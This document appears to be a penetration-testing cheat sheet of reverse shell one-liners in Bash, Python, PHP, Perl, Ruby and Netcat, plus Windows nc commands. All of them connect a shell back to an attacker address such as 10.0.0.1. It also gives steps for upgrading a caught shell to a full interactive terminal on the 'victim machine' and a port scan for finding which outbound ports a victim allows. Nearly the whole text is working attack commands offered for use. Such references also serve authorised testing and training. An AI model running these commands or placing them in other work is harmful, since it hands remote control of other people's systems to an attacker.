## Reverse shell

**1. Reverse shell list**  

	Bash  
	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

	Python  
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

	Php  
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

	Perl  
	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

	Ruby  
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

	Netcat  
	nc -e /bin/sh 10.0.0.1 1234
	(Netcat without -e flag)
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
# Windows
nc -lvp 443
nc.exe 192.168.1.101 443 -e cmd.exe   

**== Upgrading half shells to fully interactive TTYs without closing nc session. ==**

python -c 'import pty; pty.spawn("/bin/bash")'

background remote shell with Ctrl+Z    // on victim machine

stty -a | grep rows    //on attacking machine  
speed 38400 baud; rows 55; columns 205; line = 0;  
echo $TERM     // on attacking machine  
stty raw echo   // attacking machine  
fg             // attacking machine  
reset          // attacking machine  
export SHELL=BASH          //on victim machine   
export TERM=xterm-256color //on victim machine  
stty rows 55 columns 205   //on victim machine. See stty -a  

**TBC. Check which port is allowed for reverse shell** 

	sometime certain out going traffic is blocked by your victim   
	nc -nvv -w 1 -z "Your IP Address" 1-100  
	open Wireshark  
